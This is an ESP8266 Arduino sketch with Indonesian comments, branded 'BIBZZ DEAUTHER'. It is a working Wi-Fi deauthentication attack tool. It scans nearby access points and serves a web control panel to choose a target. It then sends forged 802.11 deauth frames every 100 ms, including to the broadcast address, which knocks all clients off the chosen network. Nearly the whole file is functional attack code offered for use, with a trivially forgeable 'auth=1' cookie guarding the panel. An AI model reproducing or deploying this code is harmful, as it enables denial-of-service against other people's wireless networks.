// ==================================================
#include <ESP8266WiFi.h>
#include <EEPROM.h>
#include <ESPAsyncWebServer.h>
#include <ESP8266mDNS.h>
#include <Hash.h>

// ========== KONFIGURASI AWAL ==========
const char* ap_ssid = "Deauther";
const char* ap_password = "";  // kosong = tanpa password
AsyncWebServer server(80);

// Variabel global
String target_ap_mac = "";
String target_client_mac = "FF:FF:FF:FF:FF:FF";  // broadcast = semua client
int attack_channel = 1;
bool attack_running = false;
unsigned long attack_timer = 0;
int attack_interval = 100;
String web_password = "";






  // ms antara setiap packet (efisien)


// HTML web portal (mini + styling)
const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <title>Deauther ESP</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial; background: #0a0a0a; color: #0f0; padding: 20px; }
        .card { background: #111; border-radius: 10px; padding: 20px; margin-bottom: 20px; border: 1px solid #0f0; }
        input, select, button { background: #222; color: #0f0; border: 1px solid #0f0; padding: 8px; margin: 5px; border-radius: 5px; }
        button { cursor: pointer; }
        button:hover { background: #0f0; color: #000; }
        hr { border-color: #0f0; }
    </style>
</head>
<body>
    <div class="card">
        <h2>🔥 BIBZZ DEAUTHER 🔥</h2>
        <p>Status: <span id="status">Stopped</span></p>
        <p>Target AP: <span id="target_ap">None</span></p>
        <p>Channel: <span id="channel">-</span></p>
    </div>
    <div class="card">
        <h3>📡 Scan & Pilih Target</h3>
        <button onclick="scan()">Scan AP</button>
        <select id="ap_list" size="5"></select><br>
        <button onclick="setTarget()">Set Target AP</button>
        <button onclick="startAttack()">🚀 Start Deauth</button>
        <button onclick="stopAttack()">⏹️ Stop Deauth</button>
    </div>
    <div class="card">
        <h3>⚙️ Pengaturan Hotspot ESP</h3>
        <input type="text" id="new_ssid" placeholder="SSID baru"><br>
        <input type="text" id="new_pass" placeholder="Password (kosong = open)"><br>
        <button onclick="saveConfig()">Simpan & Reboot</button>
    </div>
    <div class="card">
        <h3>🔒 Web Login Password</h3>
        <input type="password" id="webpass" placeholder="Password baru untuk web ini"><br>
        <button onclick="setWebPass()">Set Password</button>
    </div>
    <script>
        async function scan() {
            let res = await fetch('/scan');
            let data = await res.json();
            let select = document.getElementById('ap_list');
            select.innerHTML = '';
            for(let ap of data) {
                let option = document.createElement('option');
                option.value = ap.mac + '|' + ap.channel;
                option.text = ap.ssid + ' (' + ap.mac + ') CH' + ap.channel + ' RSSI:' + ap.rssi;
                select.appendChild(option);
            }
        }
        function setTarget() {
            let sel = document.getElementById('ap_list').value;
            if(!sel) return;
            let parts = sel.split('|');
            fetch('/target?mac=' + parts[0] + '&channel=' + parts[1]);
            alert('Target set: ' + parts[0] + ' pada channel ' + parts[1]);
        }
        function startAttack() { fetch('/start'); document.getElementById('status').innerText = 'ATTACKING'; }
        function stopAttack() { fetch('/stop'); document.getElementById('status').innerText = 'Stopped'; }
        async function saveConfig() {
            let ssid = document.getElementById('new_ssid').value;
            let pwd = document.getElementById('new_pass').value;
            await fetch('/config?ssid=' + encodeURIComponent(ssid) + '&pass=' + encodeURIComponent(pwd));
            alert('Rebooting...');
            setTimeout(() => location.reload(), 3000);
        }
        async function setWebPass() {
            let pwd = document.getElementById('webpass').value;
            await fetch('/setpass?pass=' + encodeURIComponent(pwd));
            alert('Password web diset. Login ulang.');
            location.reload();
        }
        setInterval(async () => {
            let res = await fetch('/status');
            let st = await res.text();
            if(st.includes('attack')) document.getElementById('status').innerText = 'ATTACKING';
            else document.getElementById('status').innerText = 'Stopped';
            let target_res = await fetch('/targetinfo');
            let target_json = await target_res.json();
            document.getElementById('target_ap').innerText = target_json.mac;
            document.getElementById('channel').innerText = target_json.channel;
        }, 1000);
    </script>
</body>
</html>
)rawliteral";

// ========== KONFIGURASI WEB SERVER ==========
bool checkAuth(AsyncWebServerRequest *request) {
    if (web_password.length() == 0) return true;
    if (request->hasHeader("Cookie")) {
        String cookie = request->header("Cookie");
        if (cookie.indexOf("auth=1") != -1) return true;
    }
    return false;
}

void handleLogin(AsyncWebServerRequest *request) {
    if (request->hasParam("pass")) {
        String p = request->getParam("pass")->value();
        if (p == web_password) {
            AsyncWebServerResponse *response = request->beginResponse(302);
            response->addHeader("Location", "/");
            response->addHeader("Set-Cookie", "auth=1");
            request->send(response);
            return;
        }
    }
    request->send(401, "text/html", "<html><body><form method='GET'>Password: <input type='password' name='pass'><input type='submit'></form></body></html>");
}

// ========== DEAUTH PACKET GENERATION ==========
// Craft deauth frame (802.11)
void sendDeauth(uint8_t *target_mac, uint8_t *ap_mac, uint8_t channel) {
    wifi_set_channel(channel);
    uint8_t packet[26] = {
        0xC0, 0x00,          // Frame control: deauth
        0x00, 0x00,          // Duration
        // Target MAC (receiver)
        target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5],
        // Source MAC (AP)
        ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5],
        // BSSID (AP)
        ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5],
        // Sequence number (fixed)
        0x00, 0x00,
        // Reason code: 0x07 = Class 3 frame from non-associated station
        0x07, 0x00
    };
    wifi_send_pkt_freedom(packet, sizeof(packet), 0);
}

// Helper: string MAC to byte array
void macStrToBytes(const String &mac, uint8_t *bytes) {
    int vals[6];
    sscanf(mac.c_str(), "%x:%x:%x:%x:%x:%x", &vals[0], &vals[1], &vals[2], &vals[3], &vals[4], &vals[5]);
    for(int i=0;i<6;i++) bytes[i] = vals[i];
}

// ========== WEB ENDPOINTS ==========
void setupWebServer() {
    server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
        if(!checkAuth(request)) return handleLogin(request);
        request->send_P(200, "text/html", index_html);
    });
    
    server.on("/scan", HTTP_GET, [](AsyncWebServerRequest *request){
        if(!checkAuth(request)) return request->send(401);
        // Scan Wi-Fi networks
        int n = WiFi.scanComplete();
        if(n == -2) WiFi.scanNetworks(true);
        else if(n >= 0) {
            String json = "[";
            for(int i=0;i<n;i++){
                json += "{\"ssid\":\"" + WiFi.SSID(i) + "\",";
                json += "\"mac\":\"" + WiFi.BSSIDstr(i) + "\",";
                json += "\"channel\":" + String(WiFi.channel(i)) + ",";
                json += "\"rssi\":" + String(WiFi.RSSI(i)) + "}";
                if(i<n-1) json+=",";
            }
            json += "]";
            WiFi.scanDelete();
            request->send(200, "application/json", json);
        } else {
            request->send(200, "application/json", "[]");
        }
    });
    
    server.on("/target", HTTP_GET, [](AsyncWebServerRequest *request){
        if(!checkAuth(request)) return;
        if(request->hasParam("mac") && request->hasParam("channel")) {
            target_ap_mac = request->getParam("mac")->value();
            attack_channel = request->getParam("channel")->value().toInt();
            request->send(200, "text/plain", "OK");
        } else request->send(400);
    });
    
    server.on("/start", HTTP_GET, [](AsyncWebServerRequest *request){
        if(!checkAuth(request)) return;
        attack_running = true;
        request->send(200);
    });
    
    server.on("/stop", HTTP_GET, [](AsyncWebServerRequest *request){
        if(!checkAuth(request)) return;
        attack_running = false;
        request->send(200);
    });
    
    server.on("/status", HTTP_GET, [](AsyncWebServerRequest *request){
        if(!checkAuth(request)) return;
        request->send(200, "text/plain", attack_running ? "attack" : "stop");
    });
    
    server.on("/targetinfo", HTTP_GET, [](AsyncWebServerRequest *request){
        if(!checkAuth(request)) return;
        String json = "{\"mac\":\"" + target_ap_mac + "\",\"channel\":" + String(attack_channel) + "}";
        request->send(200, "application/json", json);
    });
    
    server.on("/config", HTTP_GET, [](AsyncWebServerRequest *request){
        if(!checkAuth(request)) return;
        if(request->hasParam("ssid") && request->hasParam("pass")) {
            String new_ssid = request->getParam("ssid")->value();
            String new_pass = request->getParam("pass")->value();
            // Simpan ke EEPROM (sederhana pake preferences)
            EEPROM.begin(512);
            int addr = 0;
            for(int i=0; i<new_ssid.length(); i++) EEPROM.write(addr++, new_ssid[i]);
            EEPROM.write(addr++, 0);
            for(int i=0; i<new_pass.length(); i++) EEPROM.write(addr++, new_pass[i]);
            EEPROM.write(addr++, 0);
            EEPROM.commit();
            EEPROM.end();
            request->send(200, "text/plain", "OK, rebooting...");
            delay(1000);
            ESP.restart();
        } else request->send(400);
    });
    
    server.on("/setpass", HTTP_GET, [](AsyncWebServerRequest *request){
        if(!checkAuth(request)) return;
        if(request->hasParam("pass")) {
            web_password = request->getParam("pass")->value();
            // Simpan juga ke EEPROM
            EEPROM.begin(512);
            int addr = 256;
            for(int i=0; i<web_password.length(); i++) EEPROM.write(addr++, web_password[i]);
            EEPROM.write(addr++, 0);
            EEPROM.commit();
            EEPROM.end();
            request->send(200);
        } else request->send(400);
    });
    
    server.begin();
}

// ========== SETUP ==========

void loadConfig() {
    EEPROM.begin(512);
    String ssid = "", pass = "", wp = "";
    int addr = 0;
    char c;
    while((c = EEPROM.read(addr++)) != 0 && addr < 128) ssid += c;
    while((c = EEPROM.read(addr++)) != 0 && addr < 256) pass += c;
    addr = 256;
    while((c = EEPROM.read(addr++)) != 0 && addr < 512) wp += c;
    EEPROM.end();
    if(ssid.length() > 0) {
        WiFi.softAP(ssid.c_str(), pass.c_str());
    } else {
        WiFi.softAP(ap_ssid, ap_password);
    }
    web_password = wp;
}

void setup() {
    Serial.begin(115200);
    Serial.println("\n🔥 BIBZZ DEAUTHER 🔥");
    
    loadConfig();
    // Set WiFi ke mode AP
    WiFi.mode(WIFI_AP);
    // Biarkan AP tetap hidup
    
    setupWebServer();
    
    // Persiapan packet injection
    wifi_set_opmode(STATION_MODE);
    wifi_promiscuous_enable(0);
    wifi_set_channel(1);
    
    Serial.println("Web portal: http://192.168.4.1");
}

// ========== LOOP ==========
void loop() {
    if(attack_running && target_ap_mac.length() > 0) {
        if(millis() - attack_timer >= attack_interval) {
            attack_timer = millis();
            uint8_t target_mac[6], ap_mac[6];
            macStrToBytes(target_client_mac, target_mac);
            macStrToBytes(target_ap_mac, ap_mac);
            sendDeauth(target_mac, ap_mac, attack_channel);
            // Kirim juga ke broadcast (opsional untuk lebih brutal)
            if(target_client_mac == "FF:FF:FF:FF:FF:FF") {
                // sudah broadcast
            } else {
                // tambahin broadcast buat semua client
                uint8_t bcast[] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
                sendDeauth(bcast, ap_mac, attack_channel);
            }
        }
    }
    delay(1);
}
